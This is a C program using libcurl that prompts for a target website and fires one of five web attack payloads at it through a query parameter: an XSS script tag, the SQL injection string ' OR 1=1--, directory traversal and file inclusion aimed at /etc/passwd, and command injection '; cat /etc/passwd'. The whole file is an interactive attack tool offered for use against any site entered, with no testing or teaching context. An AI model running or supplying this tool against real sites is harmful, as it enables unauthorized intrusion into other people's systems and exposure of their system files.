#include <stdio.h>
#include <string.h>
#include <curl/curl.h>

#define MAX_PAYLOAD_SIZE 1024
#define MAX_TARGET_SIZE 256
#define MAX_RESPONSE_SIZE 4096

size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    char *response = (char *)userp;
    strncat(response, (char *)contents, realsize);
    return realsize;
}

void inject_payload(char *url, char *payload) {
    CURL *curl;
    CURLcode res;
    char response[MAX_RESPONSE_SIZE] = {0};
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        }
        curl_easy_cleanup(curl);
    }
    printf("Response:\n%s\n", response);
}

void xss_payload(char *target) {
    char payload[MAX_PAYLOAD_SIZE] = "<script>alert('XSS')</script>";
    char url[MAX_TARGET_SIZE + 100];
    snprintf(url, sizeof(url), "%s?q=%s", target, payload);
    inject_payload(url, payload);
}

void sql_injection_payload(char *target) {
    char payload[MAX_PAYLOAD_SIZE] = "' OR 1=1--";
    char url[MAX_TARGET_SIZE + 100];
    snprintf(url, sizeof(url), "%s?id=%s", target, payload);
    inject_payload(url, payload);
}

void directory_traversal_payload(char *target) {
    char payload[MAX_PAYLOAD_SIZE] = "../../../../etc/passwd";
    char url[MAX_TARGET_SIZE + 100];
    snprintf(url, sizeof(url), "%s?file=%s", target, payload);
    inject_payload(url, payload);
}

void command_injection_payload(char *target) {
    char payload[MAX_PAYLOAD_SIZE] = "; cat /etc/passwd";
    char url[MAX_TARGET_SIZE + 100];
    snprintf(url, sizeof(url), "%s?command=%s", target, payload);
    inject_payload(url, payload);
}

void file_inclusion_payload(char *target) {
    char payload[MAX_PAYLOAD_SIZE] = "../../../../etc/passwd";
    char url[MAX_TARGET_SIZE + 100];
    snprintf(url, sizeof(url), "%s?file=%s", target, payload);
    inject_payload(url, payload);
}

int main() {
    char target[MAX_TARGET_SIZE];
    int option;

    printf("Enter the target website: ");
    fgets(target, MAX_TARGET_SIZE, stdin);
    target[strcspn(target, "\n")] = '\0'; // Remove newline character

    printf("Select an attack type:\n");
    printf("1. XSS\n");
    printf("2. SQL Injection\n");
    printf("3. Directory Traversal\n");
    printf("4. Command Injection\n");
    printf("5. File Inclusion\n");
    printf("Enter your choice (1-5): ");
    scanf("%d", &option);

    switch (option) {
        case 1:
            xss_payload(target);
            break;
        case 2:
            sql_injection_payload(target);
            break;
        case 3:
            directory_traversal_payload(target);
            break;
        case 4:
            command_injection_payload(target);
            break;
        case 5:
            file_inclusion_payload(target);
            break;
        default:
            printf("Invalid option. Exiting.\n");
            break;
    }

    return 0;
}
